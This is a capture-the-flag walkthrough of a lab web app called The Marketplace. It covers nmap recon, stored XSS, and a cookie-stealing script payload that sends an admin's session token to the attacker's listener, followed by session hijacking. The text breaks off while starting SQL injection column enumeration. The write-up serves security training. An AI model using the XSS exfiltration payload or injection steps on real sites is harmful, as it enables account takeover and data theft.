# The Marketplace
## Difficulty: Medium

Let's start with nmap scan:
```bash
nmap -sV -sC 10.10.3.15 | tee nmap/start
```

The results:
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c83cc56265eb7f5d9224e93b11b523b9 (RSA)
|   256 06b799940b091439e17fbfc75f99d39f (ECDSA)
|_  256 0a75bea260c62b8adf4f457161ab60b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The SSH version is high enough to not be vulnerable, so I'll start with the http service.

In the scan it also found that in the robots.txt directory there is an "/admin" directory.

![image](https://user-images.githubusercontent.com/114166939/232095399-3b9e8fbb-7b3c-458f-8a36-1401c960d4cb.png)

It's forbidden:

![image](https://user-images.githubusercontent.com/114166939/232095591-266d7b01-2bd2-40a0-a63f-16d0f62c2655.png)

I'll sign up with a test account:

username = test

password = test

![image](https://user-images.githubusercontent.com/114166939/232096934-f68dfe06-c1d5-490a-b58b-ab601e0f38af.png)

Success!

Now let's login to this user:
Success!

![image](https://user-images.githubusercontent.com/114166939/232097504-f3174c72-dcdc-46f5-b534-c4b3c167054a.png)

Also noticed I have cookie now - using the cookie manager firefox extension.

![image](https://user-images.githubusercontent.com/114166939/232098050-972050bf-9921-4b3d-b38a-9164f17e2832.png)

By using CyberChef (from "https://gchq.github.io/CyberChef/") I can understand what type of encode this server use and what is the data stored in the cookie.

![image](https://user-images.githubusercontent.com/114166939/232099019-3d27ee92-fea8-4aaa-9126-7386e1e678bc.png)

```
{
    "userId": 4,
    "username": "test",
    "admin": false,
    "iat": 1681488332
}
```

So the server probably identify the users by "userId" and "username" parameters.

This information will be important in the near future!
Let's move on to the New listing ("http://10.10.171.31/new") page:

![image](https://user-images.githubusercontent.com/114166939/232100022-ae881109-485a-4a4f-8020-d827fb8569c4.png)

I'll try exploit this page with xss payloads,
For beginning I'll try the simplest exploit in the title input:
```html
<script>alert(1)</script>
```
Didn't work:

![image](https://user-images.githubusercontent.com/114166939/232100940-7a66c85d-2dbd-4908-b04c-aad6c5327ceb.png)

Let's try in the description input:

![image](https://user-images.githubusercontent.com/114166939/232101091-70b6a894-ece1-420a-a82d-63718944d837.png)

It works!

![image](https://user-images.githubusercontent.com/114166939/232101158-1cf33e18-0bbb-4ecc-bc20-45d2601fb543.png)

Also when I'm going to the home page and clicking on this listing the alert pops out.
It is a reflected and stored xss!

The 2 options for this listing are: "Contact the listing author" and 
"Report listing to admins" - when I report the listing the following message appear:

![image](https://user-images.githubusercontent.com/114166939/232110868-dbbdf845-0b1e-4333-834b-67b03616991e.png)

Which means that after I reported the listing an admin opened it!
If that's the case I can try steal the admin's cookie.

I'll use a code from this github page "https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md":
(The Silent One-Liner)
```html
<script>var i=new Image;i.src="http://[IP]:[PORT]/?"+document.cookie;</script>
```
It need to be modified as my tun0 IP and port.

Before add the listing, I'll establish python3 server on my attacker machine:
```bash
python3 -m http.server
```
Now I'll add the exploit:

![image](https://user-images.githubusercontent.com/114166939/232113668-933bb211-5ef9-4292-883c-694e716b164e.png)

Report this listing:

![image](https://user-images.githubusercontent.com/114166939/232113844-a5f8b17e-37d0-486d-bd42-e5f3e1ef06e2.png)

Refresh and let's take a look at my python3 server!

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.14.50.11 - - [14/Apr/2023 13:20:31] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjgxNDg4MzMyfQ.LOu-eEsb_vaK-pZ8xZjVHvaVNuFRjRzyq3yAps2tAnY HTTP/1.1" 200 -

10.10.171.31 - - [14/Apr/2023 13:21:26] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODE0OTI4ODd9.YI1C9_Iu632z1-0xDX1jm0DUeFwiGgqiDR1joEGcKzw HTTP/1.1" 200 -
```

The first one is my current user cookie, the same one as I checked in my cookie manager extension.

The second request I got have different cookie!
Probably the admin's user cookie, I'll check it in CyberChef:

![image](https://user-images.githubusercontent.com/114166939/232114890-be430831-c00a-4d33-a986-4fdc666f62ee.png)

It's michael's cookie.

Now I can change the current user cookie with michael's user cookie - I'll do it with cookie manager:

Copy the token from the request, delete the current cookie, paste michael's cookie and save.

![image](https://user-images.githubusercontent.com/114166939/232116054-9115e1c8-2f66-41e3-af69-4716606596f0.png)


Refresh on the home page:

![image](https://user-images.githubusercontent.com/114166939/232116191-be8c47ea-9607-4b36-a73f-d35913a8fb9e.png)

There is a new option in the website, "Administration panel", it redirect to the "/admin" directory.

Got the first flag:

![image](https://user-images.githubusercontent.com/114166939/232116820-b3ed3d55-4cfd-415c-b758-86d5308e4c77.png)

Now let's click on the system user:

![image](https://user-images.githubusercontent.com/114166939/232117026-e9513b4c-5bad-4362-85f8-a80c7f2c56c1.png)

This page use GET method and it and maybe it's vulnerable to sqli in the "user" parameter - "http://10.10.171.31/admin?user=1".

The easiest way to test the url is to add ' and check its response:
```url
http://10.10.171.31/admin?user=1'
```

![image](https://user-images.githubusercontent.com/114166939/232117835-abc95af0-4082-4703-929a-afa263519e99.png)

It's probably vulnerable, also it written that this website use MySQL server!

Let's try find out how much columns are in the tables of this DataBase with SQL injection to the url:
```url
http://10.10.171.31/admin?user=1 order by 1-- -
```

It responded the same, than I'll increase the column numbers until the website will response differently:
